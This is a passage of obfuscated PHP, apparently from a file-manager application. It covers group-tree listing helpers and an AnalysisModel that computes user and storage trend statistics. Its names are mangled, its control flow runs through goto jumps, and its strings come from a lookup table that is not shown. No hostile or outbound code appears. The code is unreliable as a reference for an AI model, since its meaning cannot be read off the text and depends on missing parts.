e½ŒâÉ°Ì: $BÃÍ§†í÷ =& $_SERVER[İë¬“ÅÒÛ›]; $BÆóä’°Í‘ = strtolower($BÆóä’°Í‘); $bíœ‰Î¥Ç· = array($BÃÍ§†í÷[88] => $A¶—ï’Àµà, $BÃÍ§†í÷[360] => array($BÃÍ§†í÷[521], "\x25{$BÆóä’°Í‘}\x25")); goto dŞ¶ÜËĞÜ; bÀÇîáÓôÉ: $fóØÂéŞ•£ = $this->where(array($BÃÍ§†í÷[1629] => array($BÃÍ§†í÷[7], $F®Ç¶ÉçãÏ)))->select(); if (!$fóØÂéŞ•£) { return array(); } return $fóØÂéŞ•£; goto FØáÔ¹š÷; dŞ¶ÜËĞÜ: $F®Ç¶ÉçãÏ = Model($BÃÍ§†í÷[1640])->where($bíœ‰Î¥Ç·)->limit($Aƒ¼ˆ‘«ÔÑ)->select(); if (!$F®Ç¶ÉçãÏ) { return array(); } $F®Ç¶ÉçãÏ = array_to_keyvalue($F®Ç¶ÉçãÏ, $BÃÍ§†í÷[33], $BÃÍ§†í÷[1546]); goto bÀÇîáÓôÉ; FØáÔ¹š÷: } protected function _listDataApplyItem($aŞêÁäí¨“) { $AôÊÍ™¢‚† = array($aŞêÁäí¨“); $this->_listDataApply($AôÊÍ™¢‚†); return $AôÊÍ™¢‚†[0]; } protected function _listDataApply(&$FÁõ£ĞÜ) { goto D“ã‘·óª°; D“ã‘·óª°: $d“Å¡ ¬å =& $_SERVER[İë¬“ÅÒÛ›]; if (!$FÁõ£ĞÜ) { return; } $A×ÃƒŠÖ² = array_to_keyvalue($FÁõ£ĞÜ, $d“Å¡ ¬å[33], $d“Å¡ ¬å[1546]); goto d•¡ÃÎõà; d®Ôæ‡ßÛŞ: $this->_listAppendParent($FÁõ£ĞÜ); $this->_listAppendSourceRoot($FÁõ£ĞÜ, $A×ÃƒŠÖ²); goto cÅß±¦ˆ®÷; d•¡ÃÎõà: $this->_listAppendChildren($FÁõ£ĞÜ); $this->_listAppendChildrenMember($FÁõ£ĞÜ); $this->_listAppendMeta($FÁõ£ĞÜ, $A×ÃƒŠÖ²); goto d®Ôæ‡ßÛŞ; cÅß±¦ˆ®÷: } private function _listAppendChildren(&$DÒÊ‰²¦î–) { goto dõ‡Ğó¿Ë¼; dÓëî‚£÷Õ: $D÷„Éİ†™ô = array_to_keyvalue($D÷„Éİ†™ô, $Aˆ Áî±›Œ[1642]); foreach ($DÒÊ‰²¦î– as &$b¥ïâ¦ÄÒ¯) { $b¥ïâ¦ÄÒ¯[$Aˆ Áî±›Œ[1643]] = isset($D÷„Éİ†™ô[$b¥ïâ¦ÄÒ¯[$Aˆ Áî±›Œ[1546]] . $Aˆ Áî±›Œ[1644]]); } goto b¬ÑŸˆÜç¹; eöñÑè²íŞ: $BÒºŞÂ’ó† = count($DÒÊ‰²¦î–); $eÏç¯‡ÙÓ = $this->tablePrefix . $this->tableName; for ($BÍ²½ˆ‚Â = 0, $cé¦Â‡µµƒ = 0; $BÍ²½ˆ‚Â < $BÒºŞÂ’ó†; $BÍ²½ˆ‚Â++) { $cé¦Â‡µµƒ++; $fªâ¬äòŠ = $DÒÊ‰²¦î–[$BÍ²½ˆ‚Â][$Aˆ Áî±›Œ[1546]]; $fïÕñóó .= "\123\x45\114\x45\x43\124\40\52\x20\x46\122\117\115\40\50\123\105\114\105\x43\124\40\x27{$fªâ¬äòŠ}\137\x63\150\x69\154\144\x27\x20\141\163\x20\x68\141\163\x20\x46\122\117\115\x20\x60{$eÏç¯‡ÙÓ}\140\40\167\150\x65\x72\145\x20\160\141\x72\145\x6e\164\111\x44\x3d{$fªâ¬äòŠ}\x20\x6c\x69\155\x69\x74\40\61\51\40\x61\163\x20\x74\x62\137{$fªâ¬äòŠ}\40\165\156\151\x6f\156\40\141\154\154\x20"; if (($cé¦Â‡µµƒ >= 20 || $BÍ²½ˆ‚Â == $BÒºŞÂ’ó† - 1) && $fïÕñóó) { $fïÕñóó = substr($fïÕñóó, 0, -strlen($Aˆ Áî±›Œ[1641])); $E†•‡İÉ‹Û = $this->query($fïÕñóó); $D÷„Éİ†™ô = array_merge($D÷„Éİ†™ô, $E†•‡İÉ‹Û); $cé¦Â‡µµƒ = 0; $fïÕñóó = $Aˆ Áî±›Œ[33]; } } goto dÓëî‚£÷Õ; dõ‡Ğó¿Ë¼: $Aˆ Áî±›Œ =& $_SERVER[İë¬“ÅÒÛ›]; $fïÕñóó = $Aˆ Áî±›Œ[364]; $D÷„Éİ†™ô = array(); goto eöñÑè²íŞ; b¬ÑŸˆÜç¹: } private function _listAppendChildrenMember(&$e™…‚ÃÙë³) { goto F•äËô¡Œ; F•äËô¡Œ: $bÑ¾æôÅ²Ã =& $_SERVER[İë¬“ÅÒÛ›]; $c•¿êù«‹ = $bÑ¾æôÅ²Ã[364]; $cÊğ‘¼©£ = array(); goto d©¬Ëƒ¡Û¯; EŸº ßš: $cÊğ‘¼©£ = array_to_keyvalue($cÊğ‘¼©£, $bÑ¾æôÅ²Ã[1642]); foreach ($e™…‚ÃÙë³ as &$B¯¶´ÆŠ†) { $B¯¶´ÆŠ†[$bÑ¾æôÅ²Ã[1645]] = isset($cÊğ‘¼©£[$B¯¶´ÆŠ†[$bÑ¾æôÅ²Ã[1546]] . $bÑ¾æôÅ²Ã[1644]]); } goto E­¶—ø§¢; d©¬Ëƒ¡Û¯: $Eô§¿£ìœé = count($e™…‚ÃÙë³); $eÅ»ê®˜„ƒ = $this->tablePrefix . $bÑ¾æôÅ²Ã[1631]; for ($AÑ¤º‚Ø° = 0, $C…‚…÷È”µ = 0; $AÑ¤º‚Ø° < $Eô§¿£ìœé; $AÑ¤º‚Ø°++) { $C…‚…÷È”µ++; $e¥¦³…ÒÂ = $e™…‚ÃÙë³[$AÑ¤º‚Ø°][$bÑ¾æôÅ²Ã[1546]]; $c•¿êù«‹ .= "\x53\x45\x4c\x45\x43\124\40\x2a\x20\106\122\x4f\115\x20\x28\123\105\x4c\x45\x43\x54\x20\47{$e¥¦³…ÒÂ}\x5f\143\x68\151\154\144\x27\40\x61\x73\40\150\x61\x73\x20\x46\x52\117\x4d\x20\x60{$eÅ»ê®˜„ƒ}\x60\40\x77\150\x65\x72\145\x20\147\162\x6f\x75\160\x49\x44\75{$e¥¦³…ÒÂ}\x20\x6c\x69\155\151\x74\x20\61\51\40\141\x73\40\164\142\x5f{$e¥¦³…ÒÂ}\x20\165\156\x69\157\156\40\141\x6c\154\40"; if (($C…‚…÷È”µ >= 20 || $AÑ¤º‚Ø° == $Eô§¿£ìœé - 1) && $c•¿êù«‹) { $c•¿êù«‹ = substr($c•¿êù«‹, 0, -strlen($bÑ¾æôÅ²Ã[1641])); $c¹¹Üî¿© = $this->query($c•¿êù«‹); $cÊğ‘¼©£ = array_merge($cÊğ‘¼©£, $c¹¹Üî¿©); $C…‚…÷È”µ = 0; $c•¿êù«‹ = $bÑ¾æôÅ²Ã[33]; } } goto EŸº ßš; E­¶—ø§¢: } private function _listAppendMeta(&$fæÜÑÚŒ, $a¯ˆÃ‡–˜÷) { $b·¹ĞæØñ¼ =& $_SERVER[İë¬“ÅÒÛ›]; $aæÀÈ–Ëµ¨ = array($b·¹ĞæØñ¼[1546] => array($b·¹ĞæØñ¼[7], $a¯ˆÃ‡–˜÷)); $EÒïŞ›ÊÆŒ = Model($b·¹ĞæØñ¼[1630])->where($aæÀÈ–Ëµ¨)->select(); $EÒïŞ›ÊÆŒ = array_to_keyvalue_group($EÒïŞ›ÊÆŒ, $b·¹ĞæØñ¼[1546]); foreach ($EÒïŞ›ÊÆŒ as &$BĞĞªª…ñà) { $BĞĞªª…ñà = array_to_keyvalue($BĞĞªª…ñà, $b·¹ĞæØñ¼[88], $b·¹ĞæØñ¼[360]); } foreach ($fæÜÑÚŒ as &$Eä¡Î“èï§) { $Eä¡Î“èï§[$b·¹ĞæØñ¼[1592]] = array(); if (isset($EÒïŞ›ÊÆŒ[$Eä¡Î“èï§[$b·¹ĞæØñ¼[1546]]])) { $Eä¡Î“èï§[$b·¹ĞæØñ¼[1592]] = $EÒïŞ›ÊÆŒ[$Eä¡Î“èï§[$b·¹ĞæØñ¼[1546]]]; } } } protected function parentLevelArray($b«„‰áÄñÅ) { $E ºø‡µ±  =& $_SERVER[İë¬“ÅÒÛ›]; $b«„‰áÄñÅ = explode($E ºø‡µ± [47], trim($b«„‰áÄñÅ, $E ºø‡µ± [47])); $b«„‰áÄñÅ = array_remove_value($b«„‰áÄñÅ, $E ºø‡µ± [403]); return $b«„‰áÄñÅ; } private function _listAppendParent(&$fáÜŠ¦ÉÔË) { goto DÏ¿Úå®Å…; D“‘«‘ç‹: $cˆ‹Ôª³ñÓ = array(); foreach ($BÌè’‚ò§« as $fª‡ÑÄ´¹ => $FĞàÈÚ’ÖŒ) { if (!$FĞàÈÚ’ÖŒ) { $cˆ‹Ôª³ñÓ[] = $fª‡ÑÄ´¹; } } if ($cˆ‹Ôª³ñÓ) { $f–â³êƒ«ë = array($AâÊàõ[1629] => array($AâÊàõ[983], $cˆ‹Ôª³ñÓ)); $Dî«‰ß  = $this->field($AâÊàõ[1646])->where($f–â³êƒ«ë)->select(); $bß×í±…šï = array_to_keyvalue($Dî«‰ß , $AâÊàõ[1546], $AâÊàõ[28]); $BÌè’‚ò§« = array_merge_index($BÌè’‚ò§«, $bß×í±…šï); } goto eôê‰ï†ãÒ; DÏ¿Úå®Å…: $AâÊàõ =& $_SERVER[İë¬“ÅÒÛ›]; $BÌè’‚ò§« = array(); foreach ($fáÜŠ¦ÉÔË as &$aß‚´ºé‡Ã) { $BÌè’‚ò§«[$aß‚´ºé‡Ã[$AâÊàõ[1546]]] = $aß‚´ºé‡Ã[$AâÊàõ[28]]; $bÁ“÷ä…ëê = $this->parentLevelArray($aß‚´ºé‡Ã[$AâÊàõ[374]]); foreach ($bÁ“÷ä…ëê as $cÅ§‘™£) { if (!isset($BÌè’‚ò§«[$cÅ§‘™£])) { $BÌè’‚ò§«[$cÅ§‘™£] = 0; } } } goto D“‘«‘ç‹; eôê‰ï†ãÒ: foreach ($fáÜŠ¦ÉÔË as &$aß‚´ºé‡Ã) { $bÁ“÷ä…ëê = $this->parentLevelArray($aß‚´ºé‡Ã[$AâÊàõ[374]]); $Bîàƒ™½‘Œ = $AâÊàõ[33]; foreach ($bÁ“÷ä…ëê as $cÅ§‘™£) { $Bîàƒ™½‘Œ .= $BÌè’‚ò§«[$cÅ§‘™£] . $AâÊàõ[8]; } if ($bÁ“÷ä…ëê) { $Bîàƒ™½‘Œ .= $aß‚´ºé‡Ã[$AâÊàõ[28]]; } $aß‚´ºé‡Ã[$AâÊàõ[1647]] = str_replace($AâÊàõ[1359], $AâÊàõ[8], $Bîàƒ™½‘Œ); } goto Eğ¯¡õËÑ÷; Eğ¯¡õËÑ÷: } private function _listAppendSourceRoot(&$eˆ¾Ï¶¹¹ì, $FÒÛÄº‡äŠ) { $aÈğä®…× =& $_SERVER[İë¬“ÅÒÛ›]; $Eø›ô÷ë²¨ = array($aÈğä®…×[394] => SourceModel::TYPE_GROUP, $aÈğä®…×[385] => 0, $aÈğä®…×[396] => array($aÈğä®…×[7], $FÒÛÄº‡äŠ)); $aäØ®àŒô± = Model($aÈğä®…×[522])->field($aÈğä®…×[1648])->where($Eø›ô÷ë²¨)->select(); $aäØ®àŒô± = array_to_keyvalue($aäØ®àŒô±, $aÈğä®…×[396]); $aäØ®àŒô± = array_remove_key($aäØ®àŒô±, $aÈğä®…×[396]); foreach ($eˆ¾Ï¶¹¹ì as &$DàÇË‘·¾) { $DàÇË‘·¾[$aÈğä®…×[861]] = $aäØ®àŒô±[$DàÇË‘·¾[$aÈğä®…×[1546]]] ? $aäØ®àŒô±[$DàÇË‘·¾[$aÈğä®…×[1546]]] : array(); } } protected function resetParentLevel() { $fÁ¥ˆµµÓé =& $_SERVER[İë¬“ÅÒÛ›]; $d¹Ã¸ÍœÌ = $fÁ¥ˆµµÓé[1546]; $aÓ­‹…ŸĞÕ = $this->select(); $aÓ­‹…ŸĞÕ = array_to_keyvalue($aÓ­‹…ŸĞÕ, $d¹Ã¸ÍœÌ); foreach ($aÓ­‹…ŸĞÕ as $BÜ×É°«·Ó) { goto eÓâŸÈÇˆÍ; eÓâŸÈÇˆÍ: $B¨ØÔÖœ™… = $BÜ×É°«·Ó; $aã¯³¹¹Ø  = array(); while ($B¨ØÔÖœ™…[$fÁ¥ˆµµÓé[385]] != 0) { $aã¯³¹¹Ø [] = $B¨ØÔÖœ™…[$fÁ¥ˆµµÓé[385]]; $B¨ØÔÖœ™… = $aÓ­‹…ŸĞÕ[$B¨ØÔÖœ™…[$fÁ¥ˆµµÓé[385]]]; } goto F‚‰ñØ†ãœ; Eå“è†Îá¹: $this->where(array($d¹Ã¸ÍœÌ => $BÜ×É°«·Ó[$d¹Ã¸ÍœÌ]))->save(array($fÁ¥ˆµµÓé[400] => $aã¯³¹¹Ø )); goto fÉ­ÜÅù’õ; F‚‰ñØ†ãœ: $aã¯³¹¹Ø [] = 0; $aã¯³¹¹Ø  = $fÁ¥ˆµµÓé[47] . implode($fÁ¥ˆµµÓé[47], array_reverse($aã¯³¹¹Ø )) . $fÁ¥ˆµµÓé[47]; $this->setNamePinyin($BÜ×É°«·Ó[$d¹Ã¸ÍœÌ], $BÜ×É°«·Ó[$fÁ¥ˆµµÓé[28]]); goto Eå“è†Îá¹; fÉ­ÜÅù’õ: } return $aÓ­‹…ŸĞÕ; } public function groupNameAuto($Eôë­ Øª, $e¹£¬™¢ò•) { $FÂ³‹—öÃ¥ =& $_SERVER[İë¬“ÅÒÛ›]; $EÁÌÇ¦šø = $this->where(array($FÂ³‹—öÃ¥[399] => $Eôë­ Øª))->getField($FÂ³‹—öÃ¥[28], !0); if (!$EÁÌÇ¦šø || !in_array($e¹£¬™¢ò•, $EÁÌÇ¦šø)) { return $e¹£¬™¢ò•; } for ($Cã‡Ò˜‰Õ = 1; $Cã‡Ò˜‰Õ <= count($EÁÌÇ¦šø) + 1; $Cã‡Ò˜‰Õ++) { $eê¦ĞèÙ‰È = $e¹£¬™¢ò• . "\50{$Cã‡Ò˜‰Õ}\51"; if (!in_array($eê¦ĞèÙ‰È, $EÁÌÇ¦šø)) { return $eê¦ĞèÙ‰È; } } } } goto D¯…ùáÙø“; E¿Ïãğ×Ÿô: class AnalysisModel extends ModelBaseLight { public function init($cŠÁËÁÔÃ) { $e“ÊçÕÛ¾‚ =& $_SERVER[İë¬“ÅÒÛ›]; $aÒšøğÍŞ = array($e“ÊçÕÛ¾‚[417] => array($e“ÊçÕÛ¾‚[29] => $e“ÊçÕÛ¾‚[1471], $e“ÊçÕÛ¾‚[265] => array($e“ÊçÕÛ¾‚[217], $e“ÊçÕÛ¾‚[458], $e“ÊçÕÛ¾‚[1472], $e“ÊçÕÛ¾‚[1473])), $e“ÊçÕÛ¾‚[1474] => array($e“ÊçÕÛ¾‚[29] => $e“ÊçÕÛ¾‚[1475], $e“ÊçÕÛ¾‚[265] => array($e“ÊçÕÛ¾‚[217], $e“ÊçÕÛ¾‚[456], $e“ÊçÕÛ¾‚[1476], $e“ÊçÕÛ¾‚[1477], $e“ÊçÕÛ¾‚[1478]))); if (!isset($aÒšøğÍŞ[$cŠÁËÁÔÃ])) { return !1; } $this->optionType = $aÒšøğÍŞ[$cŠÁËÁÔÃ][$e“ÊçÕÛ¾‚[29]]; $this->field = $aÒšøğÍŞ[$cŠÁËÁÔÃ][$e“ÊçÕÛ¾‚[265]]; return !0; } public function listData($F¡ÙšÈ×¾ = false, $dêÉ³¹…å˜ = "\x6d\157\144\x69\x66\x79\124\151\155\x65", $CŞö¶‰’à = false) { return parent::listData($F¡ÙšÈ×¾, $dêÉ³¹…å˜, $CŞö¶‰’à); } public function trendList($DŠÛ½îÃïÓ) { goto AğŒ‚±š¨Æ; AğŒ‚±š¨Æ: $eãÕöê§·Ù =& $_SERVER[İë¬“ÅÒÛ›]; $DÉµèåÉ• = $this->listData(); if ($DÉµèåÉ•) { $A”ÙğØ¢ìĞ = end($DÉµèåÉ•); $aÆÄ÷ËÍ†„ = date($eãÕöê§·Ù[1479], strtotime($eãÕöê§·Ù[1480])); if ($A”ÙğØ¢ìĞ[$eãÕöê§·Ù[217]] == $aÆÄ÷ËÍ†„) { return $DÉµèåÉ•; } $B£åô­ï = strtotime($A”ÙğØ¢ìĞ[$eãÕöê§·Ù[217]]); } goto Dğ«Ï©°§²; bŠ£àÑ¬Ã÷: foreach ($Cá…ÓÄİöï as $aÆÄ÷ËÍ†„) { $this->{$aà¬Éè‰ë}($aÆÄ÷ËÍ†„); } return $this->listData(); goto d¶—Üßß‡; Dğ«Ï©°§²: if (!isset($B£åô­ï)) { $FñÖŠĞÔ¤ = $DŠÛ½îÃïÓ == $eãÕöê§·Ù[417] ? $eãÕöê§·Ù[1481] : $eãÕöê§·Ù[522]; $B£åô­ï = Model($FñÖŠĞÔ¤)->min($eãÕöê§·Ù[187]); } $aà¬Éè‰ë = $eãÕöê§·Ù[1482] . ucfirst($DŠÛ½îÃïÓ); $Cá…ÓÄİöï = $this->dateList($B£åô­ï); goto bŠ£àÑ¬Ã÷; d¶—Üßß‡: } private function dateList($aª¼ÙĞê½) { $f‡ øô°ê— =& $_SERVER[İë¬“ÅÒÛ›]; $C„ÌªÛÊí = $aª¼ÙĞê½; $f¿²ÔËºÒ¢ = strtotime($f‡ øô°ê—[1480]); $F‚ÀÕ‘‰ = array(); while ($C„ÌªÛÊí <= $f¿²ÔËºÒ¢) { $F‚ÀÕ‘‰[] = date($f‡ øô°ê—[1479], $C„ÌªÛÊí); $C„ÌªÛÊí = strtotime($f‡ øô°ê—[1483], $C„ÌªÛÊí); } return $F‚ÀÕ‘‰; } public function _recordUser($AëŸèŠÆç§ = '') { goto dÓ†Ò¿ÓÖ; dÓ†Ò¿ÓÖ: $eŒ”Íš£¹ø =& $_SERVER[İë¬“ÅÒÛ›]; $AØ»ÍÍéÜ = strtotime(date($eŒ”Íš£¹ø[1484], strtotime($AëŸèŠÆç§))); $c´î›¨ÖÆ = strtotime(date($eŒ”Íš£¹ø[1485], strtotime($AëŸèŠÆç§))); goto D³‚çÜî¨ù; D‹Ğ²Õ‚ä÷: $FĞ¥ÁŸÚÙ¹ = Model($eŒ”Íš£¹ø[1481])->where($cÎÑíİãİ”)->count($eŒ”Íš£¹ø[1095]); $cÎÑíİãİ”[$eŒ”Íš£¹ø[29]] = $eŒ”Íš£¹ø[1486]; $e´¢‘ç‰ò³ = Model($eŒ”Íš£¹ø[1487])->where($cÎÑíİãİ”)->count($eŒ”Íš£¹ø[1488]); goto bÉ½¸í­¡…; bÉ½¸í­¡…: $b«ÌÜ«†¥Ñ = array($eŒ”Íš£¹ø[217] => $AëŸèŠÆç§, $eŒ”Íš£¹ø[458] => (int) $E¹¢ÚÛÌä”, $eŒ”Íš£¹ø[1472] => (int) $FĞ¥ÁŸÚÙ¹, $eŒ”Íš£¹ø[1473] => (int) $e´¢‘ç‰ò³); return $this->insert($b«ÌÜ«†¥Ñ); goto c®¥®•¢˜ä; D³‚çÜî¨ù: $cÎÑíİãİ” = array($eŒ”Íš£¹ø[187] => array($eŒ”Íš£¹ø[697], $c´î›¨ÖÆ)); $E¹¢ÚÛÌä” = Model($eŒ”Íš£¹ø[1481])->where($cÎÑíİãİ”)->count($eŒ”Íš£¹ø[1095]); $cÎÑíİãİ”[$eŒ”Íš£¹ø[187]] = array($eŒ”Íš£¹ø[325], array($AØ»ÍÍéÜ, $c´î›¨ÖÆ)); goto D‹Ğ²Õ‚ä÷; c®¥®•¢˜ä: } public function _recordStore($AÈÅ‰Ã¿ = '') { goto cÚàºŠ¯š; Aáö£ÅÌÑ³: $FğĞÏ§Óœô = Model($c¸×ÌÄ”Ìš[522])->where($FŒ¯ã¸Œ³)->sum($c¸×ÌÄ”Ìš[78]); $FöÚÏ±Ü²Ç = array($c¸×ÌÄ”Ìš[217] => $AÈÅ‰Ã¿, $c¸×ÌÄ”Ìš[456] => (int) $E‚ºì½ÎÃ, $c¸×ÌÄ”Ìš[1476] => (int) $dÕ÷íöĞ­â, $c¸×ÌÄ”Ìš[1477] => (int) $EåÖóğå‰Æ, $c¸×ÌÄ”Ìš[1478] => (int) $FğĞÏ§Óœô); return $this->insert($FöÚÏ±Ü²Ç); goto fÜ¢ØòõÑä; Cåì«‘ÈÉø: $dÕ÷íöĞ­â = Model($c¸×ÌÄ”Ìš[412])->where($FŒ¯ã¸Œ³)->sum($c¸×ÌÄ”Ìš[78]); $FŒ¯ã¸Œ³[$c¸×ÌÄ”Ìš[376]] = 0; $E‚ºì½ÎÃ = Model($c¸×ÌÄ”Ìš[522])->where($FŒ¯ã¸Œ³)->sum($c¸×ÌÄ”Ìš[78]); goto A³Ë‡‚ß­Ù; cÚàºŠ¯š: $c¸×ÌÄ”Ìš =& $_SERVER[İë¬“ÅÒÛ›]; $e•à±®œ¥ˆ = strtotime(date($c¸×ÌÄ”Ìš[1485], strtotime($AÈÅ‰Ã¿))); $FŒ¯ã¸Œ³ = array($c¸×ÌÄ”Ìš[187] => array($c¸×ÌÄ”Ìš[697], $e•à±®œ¥ˆ)); goto Cåì«‘ÈÉø; A³Ë‡‚ß­Ù: $FŒ¯ã¸Œ³[$c¸×ÌÄ”Ìš[394]] = 1; $EåÖóğå‰Æ = Model($c¸×ÌÄ”Ìš[522])->where($FŒ¯ã¸Œ³)->sum($c¸×ÌÄ”Ìš[78]); $FŒ¯ã¸Œ³[$c¸×ÌÄ”Ìš[394]] = 2; goto Aáö£ÅÌÑ³; fÜ¢ØòõÑä: } public function trend($DÛ¥°«ÔÖ£, $a³­”¿¡“×) { goto e¾é„œí™†; e¾é„œí™†: $AåîºìğÖ³ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$this->init($DÛ¥°«ÔÖ£)) { return !1; } $b „†Û†Ò = $this->trendList($DÛ¥°«ÔÖ£); goto B¯¡ë‡ˆöÌ; B¯¡ë‡ˆöÌ: if ($b „†Û†Ò && $a³­”¿¡“× != $AåîºìğÖ³[1070]) { $Cˆåì¸ÑÚ² = $b „†Û†Ò[0][$AåîºìğÖ³[217]]; $DÉé´é·£ï = $this->validDate($a³­”¿¡“×, $Cˆåì¸ÑÚ²); $CĞˆæåŠî˜ = array(); $F®ø×è¦õĞ = array_to_keyvalue($b „†Û†Ò, $AåîºìğÖ³[217]); foreach ($DÉé´é·£ï as $e ¤ß°¼Ä¾) { if (isset($F®ø×è¦õĞ[$e ¤ß°¼Ä¾])) { $BˆõèøÈâÂ = $F®ø×è¦õĞ[$e ¤ß°¼Ä¾]; } else { $BˆõèøÈâÂ = end($b „†Û†Ò); $BˆõèøÈâÂ[$AåîºìğÖ³[217]] = $e ¤ß°¼Ä¾; if ($DÛ¥°«ÔÖ£ == $AåîºìğÖ³[417]) { $BˆõèøÈâÂ[$AåîºìğÖ³[1472]] = $BˆõèøÈâÂ[$AåîºìğÖ³[1473]] = 0; } } $CĞˆæåŠî˜[] = $BˆõèøÈâÂ; } $b „†Û†Ò = $CĞˆæåŠî˜; } $b‰âØí’ = array($AåîºìğÖ³[417] => array($AåîºìğÖ³[458] => LNG($AåîºìğÖ³[1489]), $AåîºìğÖ³[1472] => LNG($AåîºìğÖ³[1490]), $AåîºìğÖ³[1473] => LNG($AåîºìğÖ³[1491])), $AåîºìğÖ³[1474] => array($AåîºìğÖ³[456] => LNG($AåîºìğÖ³[1492]), $AåîºìğÖ³[1476] => LNG($AåîºìğÖ³[1493]), $AåîºìğÖ³[1477] => LNG($AåîºìğÖ³[1494]), $AåîºìğÖ³[1478] => LNG($AåîºìğÖ³[1495]))); $Bî¨ÏÌëå = array($AåîºìğÖ³[417] => $AåîºìğÖ³[1496], $AåîºìğÖ³[1474] => $AåîºìğÖ³[78]); goto aÉ†Å»Ê ‹; FÄèˆù°ŒÂ: return $f¿´¬öÂÓÈ; goto A‘š¼¯ùÍ£; aÉ†Å»Ê ‹: if (empty($b „†Û†Ò)) { $e ¤ß°¼Ä¾ = date($AåîºìğÖ³[1479], strtotime($AåîºìğÖ³[1480])); $añ™°è´™¨ = array($AåîºìğÖ³[217] => $e ¤ß°¼Ä¾); foreach ($b‰âØí’[$DÛ¥°«ÔÖ£] as $bõÖäÂ‹ => $b‹×´œø·) { $añ™°è´™¨[$bõÖäÂ‹] = 0; } $b „†Û†Ò[] = $añ™°è´™¨; } $f¿´¬öÂÓÈ = array(); foreach ($b „†Û†Ò as $b‹×´œø·) { if ($DÛ¥°«ÔÖ£ == $AåîºìğÖ³[1474] && $b‹×´œø·[$AåîºìğÖ³[1476]] > $b‹×´œø·[$AåîºìğÖ³[456]]) { $b‹×´œø·[$AåîºìğÖ³[1476]] = $b‹×´œø·[$AåîºìğÖ³[456]]; } foreach ($b‰âØí’[$DÛ¥°«ÔÖ£] as $bõÖäÂ‹ => $e¾¬“ÀôÉŠ) { $BˆõèøÈâÂ = array($AåîºìğÖ³[217] => $b‹×´œø·[$AåîºìğÖ³[217]], $AåîºìğÖ³[1004] => $e¾¬“ÀôÉŠ); $BˆõèøÈâÂ[$Bî¨ÏÌëå[$DÛ¥°«ÔÖ£]] = isset($b‹×´œø·[$bõÖäÂ‹]) ? $b‹×´œø·[$bõÖäÂ‹] : 0; $f¿´¬öÂÓÈ[] = $BˆõèøÈâÂ; } } goto FÄèˆù°ŒÂ; A‘š¼¯ùÍ£: } public function validDate($fî§´²íÈ³, $dñÍæ«‚Î‚) { goto føĞºĞÚÕç; føĞºĞÚÕç: $A­Áø§˜ÍŒ =& $_SERVER[İë¬“ÅÒÛ›]; $Aõ§Ã„ÕÆ = date($A­Áø§˜ÍŒ[1479], strtotime($A­Áø§˜ÍŒ[1480])); $F™¨ÇùšØ = array($Aõ§Ã„ÕÆ); goto A‘‘á”Ù; A‘‘á”Ù: switch ($fî§´²íÈ³) { case $A­Áø§˜ÍŒ[1077]: $D¶²ãºàÔƒ = mktime(0, 0, 0, date($A­Áø§˜ÍŒ[1497]), date($A­Áø§˜ÍŒ[1498]) - date($A­Áø§˜ÍŒ[966]) + 7 - 7, date($A­Áø§˜ÍŒ[1499])); $e´©¿æõ†Ò = 0; do { $B‡ÂçÖÃ÷³ = date($A­Áø§˜ÍŒ[1479], $D¶²ãºàÔƒ - 3600 * 24 * 7 * $e´©¿æõ†Ò); $F™¨ÇùšØ[] = $B‡ÂçÖÃ÷³; $e´©¿æõ†Ò++; } while ($dñÍæ«‚Î‚ < $B‡ÂçÖÃ÷³); break; case $A­Áø§˜ÍŒ[1075]: $e´©¿æõ†Ò = 1; do { $e•äÚÔçÎ¸ = date($A­Áø§˜ÍŒ[1500], strtotime("\x2d\40{$e´©¿æõ†Ò}\x20\155\157\156\164\x68\163")); $F™¨ÇùšØ[] = $e•äÚÔçÎ¸; $e´©¿æõ†Ò++; } while ($dñÍæ«‚Î‚ < $e•äÚÔçÎ¸); break; case $A­Áø§˜ÍŒ[1464]: $f÷¥Îóö¬É = (int) date($A­Áø§˜ÍŒ[1499], strtotime($dñÍæ«‚Î‚)); $CŸ“àšÙöã = (int) date($A­Áø§˜ÍŒ[1499]); if ($f÷¥Îóö¬É >= $CŸ“àšÙöã) { break; } for ($f÷¥Îóö¬É; $f÷¥Îóö¬É < $CŸ“àšÙöã; $f÷¥Îóö¬É++) { $F™¨ÇùšØ[] = $f÷¥Îóö¬É . $A­Áø§˜ÍŒ[1501]; } break; default: break; } if ($dñÍæ«‚Î‚ > end($F™¨ÇùšØ)) { array_pop($F™¨ÇùšØ); } sort($F™¨ÇùšØ); goto BŒä¿ìšİ; BŒä¿ìšİ: return $F™¨ÇùšØ; goto c«ã–±¶Ö; c«ã–±¶Ö: } public function listTable($d÷È¬Ùíô) { $dŠçÂÄ”É„ = ucfirst($d÷È¬Ùíô); return Model($dŠçÂÄ”É„)->listData(); } public function option($Cİä×ò†ƒ‚) { $b‚³òˆ¼Ì = $_SERVER[İë¬“ÅÒÛ›][1502] . ucfirst($Cİä×ò†ƒ‚); return $this->{$b‚³òˆ¼Ì}(); } private function optionUser() { goto AÙ¸ŸŸÅ; b±Ôã˜ùÉê: $CÍô…‡ÀéŸ = Model($C²ˆ¥§çÖ[1481])->where($fÅ³‘ÀÁò‰)->count($C²ˆ¥§çÖ[1095]); return array($C²ˆ¥§çÖ[453] => (int) $c¿µ‘õ·¹„, $C²ˆ¥§çÖ[1506] => (int) ($c¿µ‘õ·¹„ - $eÁº°ã„¥‚), $C²ˆ¥§çÖ[1507] => (int) $eÁº°ã„¥‚, $C²ˆ¥§çÖ[1508] => (int) $CÍô…‡ÀéŸ, $C²ˆ¥§çÖ[1509] => $e„¸…æÂ‡Û); goto C‘ˆêµ³ŒÁ; cµÆô÷Ô¥¶: $aøëÇ×÷Îã = strtotime($C²ˆ¥§çÖ[1504]); $fÅ³‘ÀÁò‰ = array($C²ˆ¥§çÖ[1505] => array($C²ˆ¥§çÖ[698], $aøëÇ×÷Îã)); $e„¸…æÂ‡Û = (int) Model($C²ˆ¥§çÖ[1481])->where($fÅ³‘ÀÁò‰)->count($C²ˆ¥§çÖ[1095]); goto aÃ­æÄŠ§¡; aÃ­æÄŠ§¡: if (!$e„¸…æÂ‡Û) { $e„¸…æÂ‡Û = 1; } $aøëÇ×÷Îã = strtotime(date($C²ˆ¥§çÖ[1484])); $fÅ³‘ÀÁò‰ = array($C²ˆ¥§çÖ[1505] => array($C²ˆ¥§çÖ[698], $aøëÇ×÷Îã)); goto b±Ôã˜ùÉê; AÙ¸ŸŸÅ: $C²ˆ¥§çÖ =& $_SERVER[İë¬“ÅÒÛ›]; $c¿µ‘õ·¹„ = 